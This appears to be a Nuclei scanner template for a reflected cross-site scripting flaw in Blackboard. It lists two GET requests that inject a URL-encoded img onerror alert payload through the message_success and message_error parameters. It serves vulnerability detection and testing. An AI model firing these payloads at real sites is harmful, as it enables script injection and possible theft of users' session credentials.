# Nuclei Template: Blackboard - Cross-Site Scripting
**Template ID:** parentlink-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`parentlink-xss.yaml`)

## Vulnerability Information & PoC

## Description
Blackboard contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
GET {{BaseURL}}/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
```

## References
- https://help.blackboard.com/Community_Engagement/Administrator/Release_Notes
